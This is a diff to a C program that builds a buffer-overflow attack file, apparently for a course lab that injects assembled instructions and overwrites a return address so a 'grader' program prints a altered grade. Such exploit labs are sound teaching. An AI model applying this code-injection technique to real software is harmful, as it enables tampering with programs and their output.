@@ -19,7 +19,7 @@ int main(void)
     unsigned long returnAddr =  0x420058UL + 8;  /* skip-B, print-grade code */
 
     /* 1) Open the attack file for binary write */
-    f = fopen("dataA", "w");
+    f = fopen("dataAplus", "w");
     fprintf(f, "%s", "BZOC");
     
     for (i = 0; i < 4; i++) { 
@@ -53,15 +53,6 @@ int main(void)
     fwrite(&instr, 4, 1, f);
     pc += 4;
 
-    /* b3) store '\0' at offset 2 */
-    instr = MiniAssembler_mov(1, 0);
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-
-    instr = MiniAssembler_strb(1, 2);
-    fwrite(&instr, 4, 1, f);
-    pc += 4;
-
     /* d) B    PRINT_ADDR(PC)       ; jump into grader’s printf */
     instr = MiniAssembler_b(PRINT_ADDR, pc);
     fwrite(&instr, 4, 1, f);  
@@ -69,7 +60,7 @@ int main(void)
     
 
     /* e) Pad stub out to 48 bytes with null bytes" */ 
-    for (i = 0; i < 8; i++) {
+    for (i = 0; i < 16; i++) {
         fprintf(f, "%c", '\0'); 
 
     }
